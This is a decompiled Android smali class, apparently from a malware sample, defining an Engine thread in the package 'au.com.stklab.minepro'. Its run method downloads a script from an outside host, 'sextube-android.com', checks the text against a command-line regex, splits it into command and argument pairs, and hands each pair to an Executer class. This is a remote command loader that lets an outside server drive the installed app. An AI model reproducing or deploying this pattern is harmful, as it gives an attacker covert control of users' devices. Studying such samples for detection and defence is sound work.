.class public Lau/com/stklab/minepro/executer/Engine;
.super Ljava/lang/Thread;


# static fields
.field private static debug:Z


# direct methods
.method public constructor <init>(Z)V
    .registers 2

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    sput-boolean p1, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    return-void
.end method


# virtual methods
.method public run()V
    .registers 9

    const/4 v0, 0x0

    :try_start_1
    sget-boolean v1, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    if-eqz v1, :cond_c

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "Get the scripts"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :cond_c
    const-string v1, "http://sextube-android.com/script.html"

    invoke-static {v1}, Lau/com/stklab/minepro/webclient/SimpleWebClient;->doGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lau/com/stklab/minepro/mineBeta;->script:Ljava/lang/String;

    sget-boolean v1, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    if-eqz v1, :cond_1f

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "Check the script format"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :cond_1f
    const-string v1, "([A-Z]+\\s.+\\n)+"

    invoke-static {v1}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v1

    sget-object v2, Lau/com/stklab/minepro/mineBeta;->script:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/regex/Matcher;->matches()Z

    move-result v1

    if-nez v1, :cond_3d

    sget-boolean v0, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    if-eqz v0, :cond_3c

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Script format invalid! Please check!"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :cond_3c
    :goto_3c
    return-void

    :cond_3d
    sget-boolean v1, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    if-eqz v1, :cond_48

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "Script format pass"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :cond_48
    sget-boolean v1, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    if-eqz v1, :cond_53

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "Parse the script into command-content array"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :cond_53
    const-string v1, "\\n"

    invoke-static {v1}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v1

    sget-object v2, Lau/com/stklab/minepro/mineBeta;->script:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/util/regex/Pattern;->split(Ljava/lang/CharSequence;)[Ljava/lang/String;

    move-result-object v2

    array-length v3, v2

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    move v1, v0

    :goto_6b
    if-lt v1, v3, :cond_95

    sget-boolean v1, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    if-eqz v1, :cond_78

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "Execute the array"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :cond_78
    new-instance v6, Lau/com/stklab/minepro/executer/Executer;

    sget-boolean v1, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    invoke-direct {v6, v1}, Lau/com/stklab/minepro/executer/Executer;-><init>(Z)V

    move v2, v0

    :goto_80
    add-int/lit8 v0, v3, -0x1

    if-le v2, v0, :cond_b0

    sget-boolean v0, Lau/com/stklab/minepro/executer/Engine;->debug:Z

    if-eqz v0, :cond_3c

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Finish"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    :try_end_8f
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_8f} :catch_90

    goto :goto_3c

    :catch_90
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3c

    :cond_95
    :try_start_95
    const-string v6, "\\s"

    invoke-static {v6}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v6

    aget-object v7, v2, v1

    invoke-virtual {v6, v7}, Ljava/util/regex/Pattern;->split(Ljava/lang/CharSequence;)[Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    aget-object v7, v6, v7

    invoke-virtual {v4, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const/4 v7, 0x1

    aget-object v6, v6, v7

    invoke-virtual {v5, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v1, v1, 0x1

    goto :goto_6b

    :cond_b0
    invoke-virtual {v4, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v5, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v6, v0, v1}, Lau/com/stklab/minepro/executer/Executer;->execute(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_bf
    .catch Ljava/lang/Exception; {:try_start_95 .. :try_end_bf} :catch_90

    add-int/lit8 v0, v2, 0x1

    move v2, v0

    goto :goto_80
.end method
